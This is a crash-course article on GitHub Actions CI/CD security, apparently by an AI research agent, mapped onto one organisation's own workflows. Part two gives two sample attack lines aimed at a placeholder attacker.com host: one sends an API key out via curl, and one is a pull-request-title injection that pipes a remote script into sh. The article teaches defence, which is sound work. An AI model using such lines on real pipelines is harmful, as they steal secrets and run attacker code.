---
title: The shape of a pipeline — a working model of git-based CI/CD, built from our own pipelines outward
date: 2026-08-27
status: research
audience:
  - developer
  - llm
related_docs:
  - docs/doc-git-serious-overlay-consensus.md
  - docs/doc-git-serious-cicd-shape-review.md
  - docs/doc-git-serious-cicd-security-prior-art.md
---

> **Crash course, 2026-08-27.** The five nouns, the trust boundary, identity, the gate, where the
> code comes from, our own estate mapped, the seven organising principles, and the walk-in order for
> an unfamiliar organisation. Written by an AI research agent; claims about our own system link to
> the file they came from. The "Ours" and "Scar" notes were margin notes in the original and are
> rendered here as blockquotes. Counts (fourteen workflows, thirteen callers, sixteen pinned
> actions) are as of the date above. Nothing here is canon — requirements live in specs. Landed from
> the published artifact on 2026-09-02 (git-serious-tap#26, item 1).

# The Shape of a Pipeline

A working model of git-based CI/CD — built from our own pipelines outward, so that any other one becomes legible on sight.

Crash course · 27 August 2026 · read the column, glance at the margin

Continuous integration is a machine that turns a commit into an artifact. Everything else — the YAML, the runners, the tokens, the rules about who may merge — exists to answer one question: *who is allowed to influence that machine, and at which moment?* Get that question in focus and the whole subject collapses into something you can hold in your head.

This is written to be read straight through. The column carries the general concept, transferable to any GitHub-based system you meet. The margin carries two other things: how we actually do it, and where the industry has been burned. Those are different registers of knowledge, so they sit in different places on the page.

Nearly every claim about our own system links to the file it came from. Our organisation is [unified-systems-com](https://github.com/unified-systems-com) and all nineteen repositories are public, so when a paragraph asserts something about how we work, you can open the file and check it. That is deliberate: a mental model you cannot verify against a real system is a story, not a model.

## Part one — The machine, in five nouns

Almost all of CI/CD is five nouns nested inside each other, each one living inside the one above it. Learn these and the vocabulary of any pipeline stops being noise — every tool, every error message, every settings page is talking about one of these five things.

**Event** — Something happened in the repository. A push, a pull request opened, a release published, a schedule firing, a human clicking a button. Every pipeline begins here — nothing runs unprompted, and if you cannot name the event, you do not yet understand why a thing ran. GitHub has roughly thirty of these, and in practice a handful account for almost everything: `push`, `pull_request`, `schedule`, and `workflow_dispatch` (the manual button).

**Workflow** — A file of instructions that says *on this event, do this work*. On GitHub it is a YAML file in the repository's `.github/workflows/` directory. One repository has many; each is completely independent of the others, listens for its own events, and knows nothing about its neighbours unless it explicitly says so. Our core repository has fourteen of them, which you can [read in full](https://github.com/unified-systems-com/tap/tree/main/.github/workflows) — the whole system is those fourteen files plus a few lines in each of thirteen other repositories.

**Job** — A unit of work inside a workflow, given its own fresh machine. Jobs run in parallel by default, unless one declares that it `needs:` another, which forces an ordering. **This is the level at which privilege is decided** — what permissions the job's token carries, which secrets are visible to it, which machine it lands on. If you are trying to work out whether something is dangerous, the job is almost always the right unit to reason about. Not the workflow, and not the step.

**Step** — One command or one reusable action, inside a job. Steps share a filesystem and run in order, so a file written by step three is there for step four. This matters more than it sounds: everything a job's steps do accumulates in one working directory, including things you did not intend to accumulate, like credentials written by a checkout.

**Runner** — The actual machine that executes the job. Either GitHub rents you a clean throwaway one — spun up for this job, destroyed afterwards — or you supply your own, called a *self-hosted* runner. A great deal of pain lives in that second option, because your machine may not be clean when the job starts and may not be destroyed when it ends. Anything a previous job left behind is available to the next one.

### One push, traced all the way through

Abstractions land better with a real trace attached, so here is what actually happens when I open a pull request against our core repository.

The **event** is `pull_request`. Two **workflows** are listening for it. The first, [`product-lines.yml`](https://github.com/unified-systems-com/tap/blob/main/.github/workflows/product-lines.yml), is the one that decides whether the change may merge; it fans out into a set of parallel **jobs** — a setup job, a secret scan, a requirements check, the test lanes, two boot gates, a fuzz lane — each on its own fresh Ubuntu **runner**. Inside each job, **steps** check out the code, install dependencies, and run the actual command. The second workflow, [`ai-review-capture.yml`](https://github.com/unified-systems-com/tap/blob/main/.github/workflows/ai-review-capture.yml), quietly collects the diff for a review that happens later and separately, for reasons that are the subject of Part two.

You can watch that happen: [every run of the gate workflow](https://github.com/unified-systems-com/tap/actions/workflows/product-lines.yml) is listed publicly, and clicking into one gives you the job graph, each job's logs, and how long each took.

See it: [the fourteen workflow files](https://github.com/unified-systems-com/tap/tree/main/.github/workflows) · [every run, all workflows](https://github.com/unified-systems-com/tap/actions) · [the gate workflow's run history](https://github.com/unified-systems-com/tap/actions/workflows/product-lines.yml)

### Written and run are different objects

One distinction cuts across all five nouns and is worth installing early, because most tools miss it and the miss is expensive.

A workflow as **written** and a workflow as **run** are two different things that happen to share a name. The written thing is a file at a path, on a branch, with a history — you can read it, diff it, and see who changed it and when. The run is an event that happened once: it has a number, a start and end time, a conclusion, a set of logs, an identity for whoever or whatever triggered it, and a specific commit it ran against.

The same workflow appears twice on GitHub, in two different places, and it is worth opening both to feel the difference: [the file](https://github.com/unified-systems-com/tap/blob/main/.github/workflows/product-lines.yml) and [its runs](https://github.com/unified-systems-com/tap/actions/workflows/product-lines.yml). Security lives mostly in the file — what it is permitted to do, what it trusts, what it checks out. Evidence lives mostly in the run — what actually happened, and whether it matched what the file implies. You need both, and almost every interesting question is really a question about the relationship between them.

> **Ours.** This distinction is the largest gap in our own model. We record jobs as *run* — status, conclusion, duration — and keep the job as *written* in an unstructured blob. Every published graph of GitHub does the opposite. Spanning both is the thing that makes a conjunction query possible.

## Part two — The trust boundary

Here is the central drama, and if you take one thing from this page, take this.

Anyone in the world can fork your repository, change anything they like, and open a pull request. The moment they do, your CI runs *their code*. That is not an oversight — it is the entire point of CI. You want to know whether their change breaks the tests, and the only way to find out is to run their change. So attacker-controlled code is now executing on a machine inside your pipeline, by design. This is not a flaw; it is the deal, and every open-source project has taken it.

The platform's answer is proportionate. When a workflow is triggered by `pull_request` **from a fork**, GitHub deliberately runs it in a weakened state: no secrets are exposed to it, and the token it receives is read-only. Their code runs, and it runs powerless. It can compile things, run tests, and burn CPU. It cannot publish a package, comment on the pull request, or read your API keys, because those things are simply not present in the environment.

> **Ours.** We accept pull requests from forks on public repositories, so this boundary is live for us, not theoretical.

That safety has a price, and the price is where things go wrong. Plenty of perfectly legitimate jobs genuinely need privilege while looking at a stranger's pull request. You might want to post a review comment — that needs write access. You might want to call a paid API — that needs a key. You might want to apply a label, update a status, or leave a benchmark result. With a powerless trigger you cannot do any of it, and this is a real problem that real projects have, not a hypothetical.

So the platform offers two escape hatches. Both are legitimate. Both are the origin of most of the serious incidents in this field.

**`pull_request_target`** — The same event, but the workflow runs in the context of *your* repository rather than the fork's — with your secrets available and a write token in hand. Crucially, by default it checks out *your* code, not theirs: the version of the workflow that runs is the one on your default branch, and the files on disk are yours. That default is the safety. Overriding it is the danger.

**`workflow_run`** — “When workflow A finishes, run workflow B.” B runs with full privilege in your repository's context, regardless of what triggered A. This is the pattern for splitting a task in half: an unprivileged workflow does the part that touches the stranger, finishes, and a privileged workflow picks up afterwards to do the part that needs power.

Both have the same shape, and it is worth stating that shape plainly because it is the thing to look for in any unfamiliar repository: an **unprivileged half** that meets the stranger's code, and then a **privileged half** that runs afterwards. That shape is entirely safe — as long as the privileged half never touches anything the stranger controls. The catastrophe is when it does.

> **Scar.** March 2025: a popular action used by tens of thousands of repositories was compromised and every version tag moved to the attacker's commit. Pipelines that trusted it by tag leaked their secrets into public build logs on the next run.

```
  Contributor's fork          Capture job                 Privileged job
  arbitrary code       -->    trigger: pull_request  -->  trigger: workflow_run
  arbitrary text              no secrets · read-only      secrets · write token
        |                                                        ^
        '- - - - - - - - every incident is this dashed line - - -'
```

*The shape is fine. The dashed line is the bug — any path that carries the contributor's code, or their text, into the half that holds the secrets.*

### The two ways the dashed line gets drawn

**The first way: checking out their branch.** It takes one line inside a privileged workflow — a checkout step that explicitly fetches the pull request's head instead of accepting the default. It usually gets added for an understandable reason (“we need to build their change to test it”), and it is fatal. Their code is now on disk in a job that has your secrets loaded as environment variables. They do not need to attack anything. They add a line to a build script — `curl attacker.com?t=$MY_API_KEY` — and your credentials leave the building on the next run. There is no exploit here. You asked CI to build a stranger's branch with the good token in the room, and it did.

**The second way: letting their text reach a shell.** This one is subtler, needs no checkout at all, and is the one people find genuinely surprising. It turns on a detail of how GitHub evaluates workflow files.

Anything written `${{ … }}` is an *expression*, and GitHub resolves it by pasting the value into the file as text **before the shell ever sees the script**. Two phases: first GitHub does a find-and-replace on the YAML, then it hands the resulting string to bash. That means the value is not data being passed to a program — it becomes part of the program.

So a workflow containing a line as innocent as:

```
run: echo "Reviewing ${{ github.event.pull_request.title }}"
```

…meets a pull request whose title is:

```
"; curl attacker.com/x | sh; #
```

…and after substitution, the script that reaches bash is `echo "Reviewing "; curl attacker.com/x | sh; #"`. The quote closes the echo, the semicolon starts a new command, and the `#` comments out the wreckage. The title became code.

This is called script injection, and it is why “we don't check out their code” is not on its own a sufficient defence. Their *text* is dangerous too — and the list of attacker-controlled text is longer than people expect: pull request titles and bodies, branch names, commit messages, issue comments, review comments, and the display name on an account. The fix is mechanical and complete: never interpolate an expression into a `run:` block. Pass it through an `env:` entry instead and reference it as a shell variable, which bash treats as data.

> **Scar.** December 2024: a widely-used Python package was compromised through a *branch name* that carried shell syntax into a build script. The attacker never needed write access to anything.

## Part three — Identity, and what holds the keys

Every pipeline needs to prove who it is — to the platform itself, to a cloud account, to a package registry. There are four mechanisms, and they are not equal in how much damage they do when they leak.

**The job's own token** — GitHub mints a short-lived credential called `GITHUB_TOKEN` for every run and hands it to each job automatically. It exists for the life of the job and then dies, so it cannot be stolen for later use — but it can be used *during* the job, and how much it can do is set by a `permissions:` block in the workflow file. The correct posture is to declare `permissions: {}` at the top of a workflow, granting nothing at all, then give each job exactly the scopes it needs and no more. A workflow with no block at all inherits an organisation-wide default, and defaults are how repositories end up holding write access nobody ever asked for.

> **Ours.** Both halves of our AI review open with `permissions: {}` and grant per job — the capture half gets only `contents: read`, and no secrets at all.

**Secrets and variables** — Encrypted values stored by the repository, organisation, or environment and injected into a run on request. Secrets hide their content everywhere — settings pages, logs, API responses — while variables are plain and visible. Two things people get wrong. First, secrets are not automatically available: a job sees only what the workflow explicitly hands it, which is why `secrets: inherit` (pass everything down) is a phrase worth searching for and worrying about. Second, **a secret's name is not itself public** — listing them requires administrative access — so the inventory of what you hold is a meaningful thing to protect. A name like `PROD_DEPLOY_KEY` tells an attacker exactly what exists and roughly what it opens.

> **Ours.** We learned this the practical way: a research document in this project listed our secret names, and a reviewer correctly flagged it. The names were generalised before publication — an exfiltration shopping list is cheap to withhold.

**Environments** — A named gate — “production”, “release”, “staging” — that a job can declare it is deploying to. An environment can require a named human to approve before the job proceeds, impose a waiting period, and restrict which branches are allowed to reach it at all. Secrets attached to an environment are visible only to jobs that have passed through its gate. This is where the genuinely dangerous credentials should live, because reaching them then costs an approval rather than a merge.

**OIDC** — The modern answer, and the one to reach for whenever a new integration appears. Instead of storing a cloud key anywhere, the run asks GitHub for a short-lived, cryptographically signed statement of identity — *I am the release workflow of this repository, running on this branch, for this organisation* — and hands that statement to the cloud provider. The provider has been configured in advance to trust statements signed by GitHub that match a specific pattern, and it issues its own short-lived credential in exchange. Three parties, no stored key, and nothing long-lived on either side. There is simply nothing to steal, and nothing to rotate.

> **Ours.** Our AWS work already federates this way: the pipeline proves its identity to the cloud account rather than holding a key. It is the pattern to reach for whenever a new integration appears.

Alongside those four sit the credentials that belong to *people and applications* rather than to runs, and they behave quite differently. A **personal access token** inherits its owner's power — everything that human can reach, it can reach — and expires on someone's calendar, which means pipelines mysteriously break on a Tuesday nine months from now. A **GitHub App** holds its own scoped grant, independent of any human, so it survives people leaving and can be given far less power than a person has; it is the right answer for anything that runs continuously. A **deploy key** is an SSH key scoped to a single repository, easy to add and famously easy to forget about. And a **self-hosted runner** is itself an identity of a sort, since whatever it can reach on your network, your pipeline can reach.

The useful question to ask of any organisation is not “are these credentials strong” but “can anyone here list them all” — and the honest answer is almost always no. That inability is the actual finding.

## Part four — The gate

The last piece is the rule that decides what may enter your main branch. Everything so far has been about what runs and what it can do; this is about what that adds up to.

Historically GitHub called this **branch protection**. The current mechanism is **rulesets**, which do the same job with more expressiveness — they can target patterns of branches, layer on top of one another, and be defined at the organisation level and inherited down. The difference matters for a practical and slightly ugly reason: the old branch-protection API does not know about rulesets, so it will cheerfully report a fully-protected branch as unprotected. If you assess a repository and it tells you there is no protection, check rulesets before believing it. A good number of published security assessments are wrong about exactly this.

> **Ours.** Exactly this happened when we inventoried ourselves. The classic API called our `main` unprotected; in fact four rulesets govern it, with **zero bypass actors**. A tool built on the old API would have been confidently wrong about us.

A ruleset can require a pull request, require a number of approving reviews, forbid force-pushes, require the branch to be up to date, and — the interesting one — require specific **status checks** to pass.

A status check deserves a moment, because it is less magical than it sounds. It is simply a named result that some workflow or app reports back to a commit: a name, a state, and optionally a link. GitHub does not know what the name means or what produced it. The ruleset says “I require a check called `gate` to be green”; something has to post a result under that exact name, and if nothing ever does, the pull request waits forever. This is why the chain matters:

> ruleset → the required check's name → the workflow that produces it → whatever that workflow trusts

Your gate is only as strong as the least trustworthy link in that chain. A required check produced by a workflow that executes an unpinned third-party action is a gate whose verdict is written by a stranger. This is the reason pinning and permissions, which look like upstream hygiene concerns, are really gate-integrity concerns.

> **Ours.** Our thirteen plugin repositories have **no required check at all**. Their CI runs, reports, and can be merged past. We found that by looking; nothing was going to tell us.

Two further details that people consistently miss.

**Bypass actors.** A ruleset may name accounts, teams, roles or apps that are permitted to skip it entirely. That list — not the rules themselves — is the real answer to “who can change main.” It is also awkward to observe: reading it requires write access to the ruleset, so a read-only credential is shown an empty field rather than an error. Which means a blank “who can bypass” must never be rendered as “nobody”; there are three states, not two — none, some, and *not observable with this credential*. Conflating the first and third is how a tool tells you a reassuring lie.

**`CODEOWNERS`.** A file mapping paths to the people or teams whose review is required when those paths change. It is a genuinely good mechanism with one nasty failure mode: if a rule names an account that has since lost access to the repository, the rule silently stops matching. Nothing turns red. The gate quietly degrades, and the only way to notice is to look.

## Part five — Where the code comes from

Almost no pipeline is only your code. Steps pull in **actions** — reusable units published by other people — and workflows call other workflows. Each reference is a dependency that you execute with your own privileges, on your own runner, inside your own trust boundary. An action is not a library you link against; it is a program you run as yourself.

A reference is written `uses: owner/repo@ref`, and that `ref` can name a *branch*, a *tag*, or a *commit hash*. Only the last of those is immutable. A branch moves by design. A tag looks permanent and is not — the publisher can move `v4` to point at any commit they like, at any time, and every pipeline referencing `@v4` will pick it up on the next run without a diff, a notification, or a pull request.

That is the mechanism behind the single most-repeated incident in this field. An attacker compromises the account of a popular action, moves every version tag to their own commit, and waits. Within hours, tens of thousands of pipelines have executed their code with whatever privileges those pipelines happened to have. Pinning by full commit hash is the defence, because a hash cannot be moved — it either is that code or it is not — and it is the first thing to look for when reading an unfamiliar repository.

Here is what a pinned reference actually looks like, taken from our own capture workflow:

```
uses: unified-systems-com/unified-ai-review/.github/workflows/capture.yml@8d7946c4c85a2814eccf0712e8f142f0f1ee3b22
# main 2026-08-23 — context full-PR-detail + open-state filter
```

The hash is the security property; the comment is the ergonomics. Without a note saying what that hash *is*, nobody can tell whether it is current, and the pin rots into something people bump blindly. Pinning without annotating trades one problem for another.

> **Ours.** Sixteen third-party actions in the core repository, all pinned by full hash — but the organisation setting that would *require* it is off. That is discipline holding the line, not policy. Discipline is one distracted afternoon from ending.

Two more surfaces travel with this one, and both are ways that code crosses between jobs without anyone describing it as a dependency.

**Caches** are shared by key across workflows in a repository, which is what makes them useful — a slow dependency install happens once and every later job reuses it. But that sharing is the risk: a low-trust job that writes a cache which a privileged job later restores has just handed code across the trust boundary, in a form nobody reviews and nothing displays. The cache is not in the diff.

**Artifacts** are files deliberately passed between jobs, which is the intended way to move results across the boundary. The failure mode is over-collection. A job that uploads its whole working directory rather than the two files it meant to share will happily include the `.git/config` that a checkout wrote — and that file contains the credential the checkout used.

> **Scar.** May 2026: the freshest incident in our corpus was a cache-poisoning chain — the most sophisticated of the recent set, and the reason a cache belongs on the graph as an object rather than a footnote.

## Part six — Our pipelines, mapped

Fourteen workflows in the core repository, plus a thin caller in each of thirteen other repositories. It sounds like a lot; it is really four ideas, and the table below is the whole estate on one screen.

| Workflow | Fires on | What it does |
|---|---|---|
| product-lines | pull request | The admission gate. Runs every lane and computes the one required check. |
| ai-review-capture | pull request | Unprivileged half of the AI review — collects the diff, holds no secrets. |
| ai-review | workflow run | Privileged half — calls the review models with the API keys. |
| plugin-ci | called | The reusable admission standard the thirteen plugin repositories call. |
| plugin-release-sbom | called | Reusable release lane — builds a plugin release and its bill of materials. |
| api-fuzz | called | Reusable fuzzing lane for the API surface. |
| api-fuzz-nightly | schedule | Runs that fuzz lane on a timer, deeper than the per-PR budget allows. |
| nightly-plugins | schedule | Skew detector — catches core changes that quietly break plugin suites. |
| all-plugins | manual | Validates the full plugin set, which no single local stack can run. |
| publish-images | push to main | Builds and publishes the container images every session pulls. |
| publish-release-tags | version tag | Retags already-published bytes. Deliberately rebuilds nothing. |
| release-please | push to main | Maintains one rolling release pull request from commit messages. |
| renovate | schedule | Proposes dependency updates as pull requests. |
| trivy-nightly | schedule | Scans the published images for newly-disclosed vulnerabilities. |

### One gate, many lanes

Only one status check is required to merge into `main`: a job named `gate`. It does no work of its own. It waits for everything else and then decides.

```
# .github/workflows/product-lines.yml
gate:
needs: [setup, secret-scan, rids, line, cold-boot, lean-boot, api-fuzz]
if: always()          # run even when a dependency failed…
# …then judge the results deliberately
```

That `if: always()` is the whole trick, and it is worth understanding why, because the naive version of this pattern is silently broken.

By default, a job with `needs:` runs only if all of its dependencies succeeded. That sounds like exactly what a gate wants — and it is a trap. A job that only runs on success cannot distinguish *passed* from *never ran*: in both cases the gate job itself is skipped, and a skipped required check is not a failed one. The gate disappears rather than objecting.

Running with `always()` inverts it. The gate runs no matter what happened upstream, then inspects each dependency's result explicitly and insists on a real answer from every lane. Nothing passes by absence.

Which shortcuts are legitimate is decided by **change tiers**. A script compares the branch against main and classifies the diff as `docs`, `specs`, or `full`; a documentation-only change skips the heavy lanes and finishes in about a minute, where a code change runs everything and takes nine or ten. The rule that makes this safe is stated in the file itself: an unknown or empty diff is treated as `full`. It fails toward doing more work, never less — and the two lanes that can never be skipped, whatever the tier, are setup and the secret scan, because documentation leaks credentials too.

### One reusable gate, thirteen callers

Each plugin repository holds a handful of lines in its own `ci.yml` that call a workflow living in the core repository — you can see [one of the callers](https://github.com/unified-systems-com/tap-plugin-aws-core/blob/main/.github/workflows/ci.yml) next to [the shared standard it calls](https://github.com/unified-systems-com/tap/blob/main/.github/workflows/plugin-ci.yml). The admission standard therefore exists exactly once and improves in one place, rather than drifting across thirteen copies that were identical the day they were created and never again.

The cost is a genuine dependency, and it is worth naming rather than glossing: those callers reference the shared workflow at `@main`, a moving target — precisely the mutable-reference risk described in Part five. It is accepted deliberately, because the alternative is thirteen pins to bump on every improvement to the gate, which in practice means the gate stops improving. This is a real trade-off with a defensible answer, not an oversight; the thing that makes it defensible is that it is written down, and that the referenced repository is our own.

### Untrusted in, privileged after

Our AI review is the Part two trust-boundary pattern done properly, and it is worth reading as a worked example, because it shows what “the privileged half never touches the stranger's code” looks like as actual files.

[The capture workflow](https://github.com/unified-systems-com/tap/blob/main/.github/workflows/ai-review-capture.yml) runs on `pull_request`, opens with `permissions: {}`, grants its one job only `contents: read`, and collects the diff. It has no secrets, because it is the half that meets the contributor. [The review workflow](https://github.com/unified-systems-com/tap/blob/main/.github/workflows/ai-review.yml) then runs on `workflow_run`, holds the API keys, and never checks out the contributor's code at all. The diff arrives as a *file*, is read from disk by a Python step, and no `${{ … }}` appears inside any `run:` block anywhere in either file.

One refinement goes beyond the standard advice. The contributor's title and body are written into a separate file explicitly marked untrusted, on the reasoning that text fed to a language model is an attack surface in its own right — the model is a program that reads text, and prompt injection is script injection wearing different clothes. The machinery itself lives in its own repository, [unified-ai-review](https://github.com/unified-systems-com/unified-ai-review), with the prompts [separated out](https://github.com/unified-systems-com/unified-ai-review-prompts) so that changing what the reviewer is told is a different kind of change from changing what it can reach.

### Machines with commit rights

Four applications are installed across the organisation, two of which can write to repositories: one proposes dependency updates, one manages releases. This is ordinary, useful, and worth stating plainly anyway — because it means the honest answer to “who can change our code” includes two robots, and robots do not read security advisories about themselves.

They are also why the bypass-actor list from Part four matters so much in practice. A bot permitted to skip the gate is a gate with a hole in it, and the hole is operated by whoever compromises the bot.

> **Ours.** Both write-capable apps are installed across *all* repositories rather than selected ones. Convenient, and worth revisiting — the blast radius of a compromised app is the whole organisation.

## Part seven — The organising principles

If someone asks what our pipelines are built on, this is the answer — seven decisions that explain almost every file in the estate. They are numbered because they are a set to hold at once, not a sequence to follow in order.

1. **One required check, computed.** The gate is a single aggregator that judges every lane's result explicitly, rather than a list of check names maintained by hand in a settings page. The rule lives in code, in the repository, where it is reviewable and diffable like anything else.
2. **Fail toward more work.** Unknown state means the heaviest tier. Every shortcut must be positively justified by a classified diff; nothing is ever skipped by absence of evidence.
3. **Define the standard once.** Thirteen repositories call one reusable workflow. Improving the admission gate is one edit, not a fan-out — and a standard nobody can improve cheaply is a standard that stops improving.
4. **Untrusted input never meets privilege.** Where a privileged step is genuinely needed, the untrusted half is stripped of everything and its output crosses as data — a file read from disk, never text interpolated into a shell.
5. **Pin what executes.** Third-party actions are referenced by full commit hash, with a comment saying what the hash is. Where a moving reference is accepted, it is accepted deliberately and written down as such.
6. **Least privilege, declared.** Workflows open with `permissions: {}` and grant per job. Nothing inherits, so no job is powerful by accident.
7. **The same road for everyone.** Changes reach main through a pull request and the gate — including the maintainer's. A direct path that exists only for one person is a hole that only one person can fall through, and eventually does.

> **Ours.** Our promote path enforces this: a session branch, a pull request, the gate, then auto-merge. Direct push survives only as a documented bootstrap hatch, and using it is visible.

Four of those seven — untrusted input, pinning, declared permissions, and the same road for everyone — are directly observable from the configuration itself. That is not a coincidence and it is not a small thing: it means a principle can stop being a sentence someone wrote down and become a question a machine can answer, repeatedly, about the system as it actually stands today.

## Part eight — Walking into a system you have never seen

This is the payoff. Given any GitHub organisation — a new employer, an acquisition, a dependency you are evaluating — this order gets you oriented fastest, because each step constrains the next. It works because it follows privilege backwards, from the thing being protected to the things that can reach it.

1. **Find the gate.** What rules protect the default branch, and which checks are required? Look at rulesets, not only branch protection, for the reason given in Part four. If nothing at all is required, everything downstream is advisory — the CI is a suggestion — and you can stop worrying about lane quality and start worrying about that.
2. **Ask who can skip it.** Bypass actors on each ruleset, organisation and repository administrators, and any app with write access. This is the real access-control answer, and it is usually shorter and more surprising than anyone expects. Remember the three states: none, some, and not observable with the credential you hold.
3. **Trace a required check back to its workflow.** Something produces that green tick; find the file that produces it and read it. You now know what the organisation actually believes is worth verifying, which is frequently different from what its documentation says it believes.
4. **Grep every workflow for the privileged triggers** — `pull_request_target`, `workflow_run`, `issue_comment`. For each hit, answer exactly two questions: does it ever check out contributor code, and does it interpolate contributor text into a `run:` block? Those two questions are where the serious incidents are, and they take about a minute each.
5. **Look at how actions are referenced.** Hashes, tags, or branches? Scroll a workflow file and the answer is immediate. One glance tells you the organisation's real supply-chain maturity better than any policy document, because this is the setting nobody can fake in a meeting.
6. **Read the permissions blocks.** Absent, broad, or minimal-and-per-job. Same signal as the previous step, taken independently — and when the two disagree, that itself is information about which team wrote which file.
7. **Inventory the non-human identities.** Installed apps and their scopes, personal access tokens, deploy keys, self-hosted runners. Two questions for each: is it still needed, and would anyone notice if it were used at three in the morning?
8. **Finally, look at what publishes.** Which workflow can push an image, a package, a release, or a deployment — and what does it trust in order to get there? That path is what an attacker is ultimately after; everything else in this list is a route toward it. If you only have time for one step, do the first and this one.

---

A last framing, because it makes the incidents feel less like a list to memorise. Nearly every real compromise was a *conjunction* — a mutable reference, plus a privileged trigger, plus a long-lived secret. Each ingredient is individually tolerable, and each is individually reported by some tool. The failure is that almost nothing shows you all three at once, in one place, for one job. That gap is the reason this product exists.
